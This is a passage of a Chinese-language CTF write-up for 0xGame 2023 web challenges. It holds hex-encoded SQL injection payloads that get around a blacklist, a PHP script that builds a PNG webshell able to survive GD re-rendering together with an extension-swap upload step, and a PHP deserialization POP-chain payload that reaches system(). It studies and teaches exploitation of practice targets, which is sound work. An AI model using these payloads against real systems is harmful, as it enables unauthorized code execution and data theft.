<span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> substr((<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag),<span class="hljs-number">31</span>,<span class="hljs-number">99</span>)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>);</code></pre>
<p>这里由于黑名单的存在，因此wp将其进行了ASCII码16进制编码绕过：</p>
<pre><code class="hljs sql"># step <span class="hljs-number">1</span>
id;<span class="hljs-keyword">set</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-number">0x73656c65637420757064617465786d6c28312c636f6e63617428307837652c2873656c65</span>
<span class="hljs-number">637420737562737472282873656</span>c65637420666c61672066726f6d20666c6167292c312c333129292c30783
<span class="hljs-number">765292</span>c31293b;<span class="hljs-keyword">prepare</span><span class="hljs-comment">/**/</span>stmt<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span>;<span class="hljs-keyword">execute</span><span class="hljs-comment">/**/</span>stmt;
# step <span class="hljs-number">2</span>
id;<span class="hljs-keyword">set</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-number">0x73656c65637420757064617465786d6c28312c636f6e63617428307837652c2873656c65</span>
<span class="hljs-number">637420737562737472282873656</span>c65637420666c61672066726f6d20666c6167292c33312c393929292c307
<span class="hljs-number">83765292</span>c31293b;<span class="hljs-keyword">prepare</span><span class="hljs-comment">/**/</span>stmt<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span>;<span class="hljs-keyword">execute</span><span class="hljs-comment">/**/</span>stmt;</code></pre>
<p>emmm大概原理是set一条待执行语句，随后将其置入prepare预处理中，接着execute执行（也没仔细学，说错了别打┭┮﹏┭┮）</p>
<p>![image-20231022174720144](0xGame 2023/image-20231022174720144.png)</p>
<p>![image-20231022174737683](0xGame 2023/image-20231022174737683.png)</p>
<p>找到flag</p>
<h2 id="week-2-ez_upload">[Week 2] ez_upload</h2>
<p>![image-20231022221053241](0xGame 2023/image-20231022221053241.png)</p>
<p>打开题目是一个文件上传题，我们下载附件可以看到对应源码，那直接分析一波</p>
<p>index.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">session_start</span>();

<span class="hljs-variable">$user_dir</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'REMOTE_ADDR'</span>]);

<span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">'uploads/'</span>.<span class="hljs-variable">$user_dir</span>)) {
    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">'uploads/'</span>.<span class="hljs-variable">$user_dir</span>);
}
<span class="hljs-meta">?&gt;</span>
&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;meta charset=<span class="hljs-string">"utf-8"</span>&gt; 
        &lt;title&gt;Gravatar&lt;/title&gt;
        &lt;script src=<span class="hljs-string">"https://cdn.bootcdn.net/ajax/libs/jquery/3.6.4/jquery.min.js"</span>&gt;&lt;/script&gt;
        &lt;script src=<span class="hljs-string">"https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/5.2.3/js/bootstrap.min.js"</span>&gt;&lt;/script&gt;
        &lt;link href=<span class="hljs-string">"https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/5.2.3/css/bootstrap.min.css"</span> rel=<span class="hljs-string">"stylesheet"</span>&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>="<span class="hljs-title">container</span> <span class="hljs-title">pt</span>-5 <span class="hljs-title">p</span>-5 <span class="hljs-title">my</span>-5 <span class="hljs-title">border</span>"&gt;</span>
<span class="hljs-class">            &lt;<span class="hljs-title">h1</span>&gt;<span class="hljs-title">Gravatar</span>&lt;/<span class="hljs-title">h1</span>&gt;</span>
<span class="hljs-class">            &lt;<span class="hljs-title">p</span>&gt;<span class="hljs-title">Upload</span> <span class="hljs-title">you</span> <span class="hljs-title">personal</span> <span class="hljs-title">avatar</span>!&lt;/<span class="hljs-title">p</span>&gt;</span>
<span class="hljs-class">            &lt;<span class="hljs-title">p</span>&gt;<span class="hljs-title">Your</span> <span class="hljs-title">upload</span> <span class="hljs-title">path</span>: &lt;<span class="hljs-title">code</span>&gt;&lt;?='<span class="hljs-title">uploads</span>/'.$<span class="hljs-title">user_dir</span>.'/'?&gt;&lt;/<span class="hljs-title">code</span>&gt;&lt;/<span class="hljs-title">p</span>&gt;</span>
<span class="hljs-class">            &lt;?<span class="hljs-title">php</span> <span class="hljs-title">if</span> (<span class="hljs-title">isset</span>($<span class="hljs-title">_SESSION</span>['<span class="hljs-title">avatar</span>']) &amp;&amp; <span class="hljs-title">file_exists</span>($<span class="hljs-title">_SESSION</span>['<span class="hljs-title">avatar</span>'])) </span>{ <span class="hljs-meta">?&gt;</span>
                &lt;p&gt;&lt;img src=<span class="hljs-string">"&lt;?=<span class="hljs-subst">$_SESSION</span>['avatar']?&gt;"</span> <span class="hljs-class"><span class="hljs-keyword">class</span>="<span class="hljs-title">rounded</span>" <span class="hljs-title">width</span>="200" <span class="hljs-title">height</span>="200"&gt;&lt;/<span class="hljs-title">p</span>&gt;</span>
<span class="hljs-class">            &lt;?<span class="hljs-title">php</span> } <span class="hljs-title">else</span> </span>{ <span class="hljs-meta">?&gt;</span>
                &lt;p&gt;You have not uploaded your avatar yet!&lt;/p&gt;
            <span class="hljs-meta">&lt;?php</span> } <span class="hljs-meta">?&gt;</span>

            &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>="<span class="hljs-title">alert</span> <span class="hljs-title">alert</span>-<span class="hljs-title">info</span>" <span class="hljs-title">id</span>="<span class="hljs-title">msg</span>" <span class="hljs-title">style</span>="<span class="hljs-title">display</span>:<span class="hljs-title">none</span>"&gt;&lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class">                &lt;<span class="hljs-title">form</span> <span class="hljs-title">onsubmit</span>="<span class="hljs-title">upload</span>(); <span class="hljs-title">return</span> <span class="hljs-title">false</span>;"&gt;</span>
<span class="hljs-class">                    &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">row</span>"&gt;</span>
<span class="hljs-class">                        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">col</span>"&gt;</span>
<span class="hljs-class">                            &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>="<span class="hljs-title">file</span>" <span class="hljs-title">name</span>="<span class="hljs-title">file</span>" <span class="hljs-title">class</span>="<span class="hljs-title">form</span>-<span class="hljs-title">control</span>" /&gt;</span>
<span class="hljs-class">                        &lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class">                        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">col</span>"&gt;</span>
<span class="hljs-class">                            &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>="<span class="hljs-title">submit</span>" <span class="hljs-title">value</span>="<span class="hljs-title">Upload</span>" <span class="hljs-title">class</span>="<span class="hljs-title">btn</span> <span class="hljs-title">btn</span>-<span class="hljs-title">primary</span>"/&gt;</span>
<span class="hljs-class">                        &lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class">                    &lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class">                &lt;/<span class="hljs-title">form</span>&gt;</span>
<span class="hljs-class">            &lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class">    &lt;/<span class="hljs-title">body</span>&gt;</span>
<span class="hljs-class"></span>
<span class="hljs-class">    &lt;<span class="hljs-title">script</span>&gt;</span>
<span class="hljs-class">        <span class="hljs-title">function</span> <span class="hljs-title">upload</span>() </span>{
            $.<span class="hljs-title function_ invoke__">ajax</span>({
                <span class="hljs-attr">url</span>: <span class="hljs-string">'upload.php'</span>,
                <span class="hljs-attr">type</span>: <span class="hljs-string">'POST'</span>,
                <span class="hljs-attr">cache</span>: <span class="hljs-literal">false</span>,
                <span class="hljs-attr">data</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>($(<span class="hljs-string">'form'</span>)[<span class="hljs-number">0</span>]),
                processData: <span class="hljs-literal">false</span>,
                contentType: <span class="hljs-literal">false</span>,
                success: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) </span>{
                    $(<span class="hljs-string">'#msg'</span>).<span class="hljs-title function_ invoke__">text</span>(data).<span class="hljs-title function_ invoke__">show</span>();
                }
            });
        }
    &lt;/script&gt;
&lt;/html&gt;</code></pre>
<p>upload.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">session_start</span>();

<span class="hljs-comment">//这里存储着一个文件上传目录地址</span>
<span class="hljs-variable">$user_dir</span> = <span class="hljs-string">'uploads/'</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'REMOTE_ADDR'</span>]).<span class="hljs-string">'/'</span>;

<span class="hljs-comment">//如果目录不存在则mkdir创建文件目录</span>
<span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$user_dir</span>)) {
    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$user_dir</span>);
}

<span class="hljs-comment">//检查文件上传类型，对应的由相应函数创建一个新图像</span>
<span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'type'</span>]) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">"image/gif"</span>:
        <span class="hljs-variable">$source</span> = <span class="hljs-title function_ invoke__">imagecreatefromgif</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'tmp_name'</span>]);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">"image/jpeg"</span>:
        <span class="hljs-variable">$source</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'tmp_name'</span>]);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">"image/png"</span>:
        <span class="hljs-variable">$source</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'tmp_name'</span>]);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">default</span>:
        <span class="hljs-keyword">die</span>(<span class="hljs-string">'Invalid file type!'</span>);
}

<span class="hljs-comment">//获取上传文件的拓展名，接着在搞一个新文件路径，由原文件的md5值和拓展名构成</span>
<span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'name'</span>], PATHINFO_EXTENSION);
<span class="hljs-variable">$filepath</span> = <span class="hljs-variable">$user_dir</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'name'</span>]).<span class="hljs-string">'.'</span>.<span class="hljs-variable">$ext</span>;

<span class="hljs-comment">//接着在以filepath为文件名创建一个新图像--这里就可以感觉出是二次渲染了</span>
<span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'type'</span>]) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">"image/gif"</span>:
        <span class="hljs-title function_ invoke__">imagegif</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">"image/jpeg"</span>:
        <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">"image/png"</span>:
        <span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">default</span>:
        <span class="hljs-keyword">die</span>(<span class="hljs-string">'Invalid file type!'</span>);
}

<span class="hljs-keyword">echo</span> <span class="hljs-string">'Upload avatar success! Path: '</span>.<span class="hljs-variable">$filepath</span>;

<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'avatar'</span>] = <span class="hljs-variable">$filepath</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里当初分析代码的时候也没发现竟然是一道二次渲染题。。。果然还是太菜了，代码审计功底也垃圾</p>
<p>这里对二次渲染用的不多，因此只得啃wp了：</p>
<pre><code class="hljs plaintext">题⽬的功能其实是个简单的 "⼆次渲染", ⼆次渲染就是指服务端对⽤户上传的图⽚进⾏了⼆次处理, 例如图⽚的裁
切, 添加⽔印等等

如果只是在图⽚的末尾简单的添加了 PHP 代码并上传, 那么经过⼆次渲染之后的图⽚是不会包含这段代码的, 因此
需要去找⼀些绕过 GD 库⼆次渲染的脚本, 然后再构造图⽚⻢</code></pre>
<p>看了几篇文章感觉二次渲染就是一个在你上传一个图片之后，服务器会去提取一个图片基本组成要素（也就是你上传的）之后在次组合成一个新图像去自己新建一个图片名字去上传保存–这里解释的也有点垃圾，后续写完wp将其中的知识点好好学学。</p>
<p>这里先复现一波png图片的上传吧，原理不细说了，参考文章如下：</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657#toc-12">https://xz.aliyun.com/t/2657#toc-12</a></p>
<p>这里有两种方法，这里我也就直接尝试其中一个简单的了（因为懒┭┮﹏┭┮</p>
<p>直接上国外大牛的脚本，一键生成png-他这里是向png写入idat数据块</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,
           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,
           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,
           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,
           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,
           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,
           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,
           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);



<span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);

<span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) {
   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];
   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];
   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];
   <span class="hljs-variable">$color</span> = <span class="hljs-title function_ invoke__">imagecolorallocate</span>(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);
   <span class="hljs-title function_ invoke__">imagesetpixel</span>(<span class="hljs-variable">$img</span>, <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);
}

<span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$img</span>,<span class="hljs-string">'./1.png'</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>之后我们可以在php环境下运行上述代码，或者直接phpstorm运行也可，将生成的png直接上传，不过这里代码并没有限制php后缀的文件，我们在页面上传后直接bp修改后缀为php即可</p>
<p>![image-20231023173148935](0xGame 2023/image-20231023173148935.png)</p>
<p>如图将png改为php上传，之后访问链接执行恶意代码即可</p>
<p>![image-20231023173221731](0xGame 2023/image-20231023173221731.png)</p>
<p>拿到flag</p>
<h2 id="week-2-ez_unserialize">[Week 2] ez_unserialize</h2>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>

<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cache</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$expired</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$helper</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$helper</span></span>) </span>{
        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;
        <span class="hljs-variable language_">$this</span>-&gt;value = <span class="hljs-variable">$value</span>;
        <span class="hljs-variable language_">$this</span>-&gt;helper = <span class="hljs-variable">$helper</span>;

        <span class="hljs-variable language_">$this</span>-&gt;expired = False;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-variable language_">$this</span>-&gt;expired = False;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">expired</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;expired) {
            <span class="hljs-variable language_">$this</span>-&gt;helper-&gt;<span class="hljs-title function_ invoke__">clean</span>(<span class="hljs-variable">$this</span>-&gt;key);
            <span class="hljs-keyword">return</span> True;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> False;
        }
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Storage</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$store</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-keyword">array</span>();
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>) </span>{
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;store) {
            <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-keyword">array</span>();
        }

        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$value</span>-&gt;<span class="hljs-title function_ invoke__">expired</span>()) {
            <span class="hljs-variable language_">$this</span>-&gt;store[<span class="hljs-variable">$name</span>] = <span class="hljs-variable">$value</span>;
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>];
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcs</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$funcs</span></span>) </span>{
        <span class="hljs-variable language_">$this</span>-&gt;funcs = <span class="hljs-variable">$funcs</span>;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$args</span></span>) </span>{
        <span class="hljs-variable language_">$this</span>-&gt;funcs[<span class="hljs-variable">$name</span>](...<span class="hljs-variable">$args</span>);
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataObject</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$storage</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;data <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) {
            <span class="hljs-variable language_">$this</span>-&gt;storage-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;
        }
    }
}

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'u'</span>])) {
    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'u'</span>]);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>依旧是浏览敏感函数，这里可以发现<code>$this-&gt;funcs[$name](...$args);</code>就是我们最终要利用的地方，那我们思考如何调用call魔术方法：</p>
<pre><code class="hljs plaintext">__call()，在对象中调用一个不可访问方法时调用</code></pre>
<p>依据上述我们可以找到<code>$this-&gt;helper-&gt;clean($this-&gt;key);</code>敏感语句，倘若我们将helper赋值为Helper对象，而其中也没有clean方法，那我们便成功调用，接下来在判断如何调用其所在的expired方法，我们接着浏览可以看到</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$value</span>-&gt;<span class="hljs-title function_ invoke__">expired</span>()) {
           <span class="hljs-variable language_">$this</span>-&gt;store[<span class="hljs-variable">$name</span>] = <span class="hljs-variable">$value</span>;
       }</code></pre>
<p>这意味着如果我们将value变量赋值为Cache对象，我们便可以成功调用，那接下来在判断如何调用其所在的set魔术方法：</p>
<pre><code class="hljs plaintext">__set()，在给不可访问属性赋值时调用</code></pre>
<p>依据上述我们可以找到</p>
<pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;data <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) {
           <span class="hljs-variable language_">$this</span>-&gt;storage-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;
       }</code></pre>
<p>这意味着如果我们将storage赋值为Storage对象时，接着将key变量赋值为对象中没有的属性，那我们便可以成功调用。综上所述我们pop链如下：</p>
<pre><code class="hljs plaintext">DataObject.__destruct() -&gt; Storage.__set() -&gt; Cache.expired() -&gt; Helper.__call()</code></pre>
<p>接下来就是变量赋值问题了，这里我也是有点手足无措，只好借助wp了。。。payload如下：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cache</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$expired</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$helper</span>;

}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Storage</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$store</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcs</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataObject</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$storage</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;
}

<span class="hljs-variable">$cache1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cache</span>();
<span class="hljs-variable">$cache2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cache</span>();
<span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataObject</span>();
<span class="hljs-variable">$poc</span>-&gt;storage = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Storage</span>();
<span class="hljs-variable">$poc</span>-&gt;storage-&gt;store = &amp;<span class="hljs-variable">$cache2</span>-&gt;expired;
<span class="hljs-variable">$cache2</span>-&gt;key = <span class="hljs-string">'php -r "phpinfo();"'</span>;
<span class="hljs-variable">$poc</span>-&gt;data = <span class="hljs-keyword">array</span>(<span class="hljs-string">'key1'</span> =&gt; <span class="hljs-variable">$cache1</span>, <span class="hljs-string">'key2'</span> =&gt; <span class="hljs-variable">$cache2</span>);
<span class="hljs-variable">$cache2</span>-&gt;helper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>();
<span class="hljs-variable">$cache2</span>-&gt;helper-&gt;funcs = <span class="hljs-keyword">array</span>(<span class="hljs-string">'clean'</span> =&gt; <span class="hljs-string">'system'</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>);

<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里在总结一波思路，首先new两个Cache对象，接着new一个DataObject对象，用于后续调用Storage.__set()方法，接着给其中的storage赋值为Storage对象，随后在将storage中的store属性与cache2的expired属性做一个引用。然后是将data属性赋值为含有两个元素的数组：</p>
<pre><code class="hljs plaintext">这里呢先看data的第一个元素也就是cache1，其在foreach循环的第一次赋值时，调用了set魔术方法，这时候其中的store属性被赋值为空数组，接着由于cache1的expired属性为false，这时候是无法成功调用clean方法的，于是store数组此时被赋值为array('key1'=&gt;$cache1)，总之此时store便不在是空了。但此时我们注意由于引用的存在，此时cache2的expired属性已经不可能为false了，紧接着在第二次foreach循环时，便可以成功调用cache2的clean方法</code></pre>
<p>接着我们将helper赋值为Helper对象，由于其中不存在clean方法，于是我们成功调用了其中的call魔术方法，并且字符串clean与key被当做call的参数，此时我们又可以将其中的funcs赋值为一个数组：<code>array('clean'=&gt;'system')</code>。其中的key为我们想要执行的恶意代码即可，这样在上述的组合下<code>$this-&gt;funcs[$name](...$args);</code>变为<code>$this-&gt;funcs['clean'](恶意代码);=&gt;system(恶意代码);</code></p>
